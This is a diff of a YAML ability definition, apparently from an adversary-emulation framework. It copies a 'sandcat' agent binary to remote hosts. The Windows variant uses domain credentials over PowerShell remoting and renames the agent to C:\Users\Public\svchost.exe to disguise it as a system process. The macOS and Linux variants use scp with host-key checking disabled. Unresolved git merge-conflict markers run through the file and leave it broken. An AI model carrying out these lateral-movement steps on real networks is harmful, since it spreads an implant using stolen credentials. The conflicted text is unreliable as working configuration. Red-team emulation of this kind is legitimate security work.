@@ -1,5 +1,8 @@
+<<<<<<< HEAD
 ---
 
+=======
+>>>>>>> a2b4f2d02f7a96ebd241898b844e9a36dfccc6be
 - id: 4908fdc4-74fc-4d7c-8935-26d11ad26a8d
   name: Copy 54ndc47 (WinRM and SCP)
   description: Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP
@@ -18,11 +21,18 @@
             $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
             $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
             $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
+<<<<<<< HEAD
             Copy-Item -Path "sandcat.go-windows" -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
+=======
+            $location = "#{location}";
+            $exe = "#{exe_name}";
+            Copy-Item $location.replace($exe, "sandcat.go-windows") -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
+>>>>>>> a2b4f2d02f7a96ebd241898b844e9a36dfccc6be
             Start-Sleep -s 5;
             Remove-PSSession -Session $session;
           };
           Receive-Job -Job $job -Wait;
+<<<<<<< HEAD
         payload: sandcat.go-windows
     darwin:
       sh:
@@ -38,3 +48,36 @@
         cleanup: |
           ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat.go-linux'
         payload: sandcat.go
+=======
+        cleanup: |
+          $job = Start-Job -ScriptBlock {
+            $username = "#{domain.user.name}";
+            $password = "#{domain.user.password}";
+            $secstr = New-Object -TypeName System.Security.SecureString;
+            $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
+            $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
+            $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
+            Invoke-Command -Session $session -Command {Remove-Item "C:\Users\Public\svchost.exe" -force};
+            Start-Sleep -s 5;
+            Remove-PSSession -Session $session;
+          };
+          Receive-Job -Job $job -Wait;
+        payloads:
+        - sandcat.go-windows
+    darwin:
+      sh:
+        command: |
+          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go
+        cleanup: |
+          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'
+        payloads:
+        - sandcat.go-darwin
+    linux:
+      sh:
+        command: |
+          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go
+        cleanup: |
+          ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'
+        payloads:
+        - sandcat.go-linux
+>>>>>>> a2b4f2d02f7a96ebd241898b844e9a36dfccc6be
